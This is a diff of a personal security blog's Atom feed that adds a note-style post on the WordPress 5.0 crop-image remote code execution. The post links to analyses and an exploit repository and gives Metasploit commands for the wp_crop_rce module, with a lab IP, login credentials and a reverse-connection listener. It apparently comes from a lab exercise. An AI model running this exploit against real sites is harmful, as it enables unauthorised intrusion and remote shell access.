@@ -4,13 +4,47 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-05-14T10:59:33+08:00</updated>
+ <updated>2022-05-17T18:17:28+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Wordpress 5 RCE</title>
+   <link href="https://mvineza.github.io/spindel/2022/05/17/wordpress-5-rce"/>
+   <updated>2022-05-17T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/05/17/Wordpress-5-RCE</id>
+   <content type="html">&lt;p&gt;&lt;strong&gt;This attack is very complicated and hard to understand for beginners&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blog.sonarsource.com/wordpress-image-remote-code-execution?redirect=rips&quot;&gt;WordPress 5.0.0 Remote Code Execution&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;[The detailed analysis of WordPress 5.0 RCE&lt;/td&gt;
+          &lt;td&gt;by Knownsec 404 team&lt;/td&gt;
+          &lt;td&gt;Medium](https://medium.com/@knownsec404team/the-detailed-analysis-of-wordpress-5-0-rce-a171ed719681)&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://pentest-tools.com/blog/wordpress-remote-code-execution-exploit-cve-2019-8942/&quot;&gt;Analysis of a WordPress Remote Code Execution Attack - Pentest-Tools.com Blog&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;https://github.com/v0lck3r/CVE-2019-8943.git&lt;/li&gt;
+  &lt;li&gt;Metasploit&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/multi/http/wp_crop_rce
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;rhosts 10.10.188.55
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;username kwheel
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;password cutiepie1
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lhost tun0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</content>
+ </entry>
  
  <entry>
    <title>HTA Handler RCE (CVE-2017-0199)</title>
